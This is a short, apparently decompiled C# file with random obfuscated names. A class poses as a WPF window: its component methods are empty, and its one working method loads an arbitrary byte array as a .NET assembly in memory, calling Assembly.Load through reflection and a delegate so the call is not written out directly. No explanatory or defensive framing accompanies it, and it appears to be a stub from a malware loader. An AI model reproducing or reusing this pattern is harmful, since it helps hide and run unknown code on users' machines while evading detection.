using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace ocfwdke;

public class mkxnzgj : Window, IComponentConnector
{
	internal delegate Assembly lmakxrq(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] ermpueu)
	{
		return ((lmakxrq)Delegate.CreateDelegate(typeof(lmakxrq), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(ermpueu);
	}

	private void A(int connectionId, object target)
	{
	}
}
